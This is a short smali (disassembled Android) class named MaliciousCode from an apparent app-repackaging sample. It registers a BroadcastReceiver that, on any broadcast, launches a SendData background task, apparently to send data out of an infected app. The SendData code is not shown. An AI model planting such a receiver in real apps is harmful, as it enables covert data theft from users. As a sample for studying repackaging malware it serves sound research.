.class public Lcom/mobiseed/repackaging/MaliciousCode;
.super Landroid/content/BroadcastReceiver;
.source "MaliciousCode.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 28
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 30
    new-instance v0, Lcom/mobiseed/repackaging/SendData;

    invoke-direct {v0, p1}, Lcom/mobiseed/repackaging/SendData;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/mobiseed/repackaging/SendData;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 31
    return-void
.end method
